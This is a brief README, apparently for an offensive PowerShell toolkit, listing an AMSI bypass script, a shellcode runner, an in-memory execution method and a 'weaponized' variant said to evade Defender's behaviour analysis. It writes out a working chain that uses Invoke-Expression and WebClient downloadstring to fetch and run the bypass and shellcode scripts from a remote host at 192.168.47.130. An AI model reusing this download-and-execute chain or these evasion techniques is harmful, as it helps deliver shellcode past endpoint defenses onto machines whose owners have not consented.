# Powershell
 
- bypass.ps1: AMSI bypass
- test.ps1: powershell shellcode runner, (payload) detected by Defender (12/23/2020) (on-disk bypassed by Invoke-Expression, AMSI bypassed by chaining)
    - Working chain (12/23/2020): `iex (new-object net.webclient).downloadstring("http://192.168.47.130/bypass.ps1"); iex (new-object net.webclient).downloadstring("http://192.168.47.130/test.ps1")`

- UnsafeNativeMethods: Run code without leaving temp file on disk + bypass Add-Type


- WP: weaponized veriosn with behavior analysis bypass (12/24/2020) 
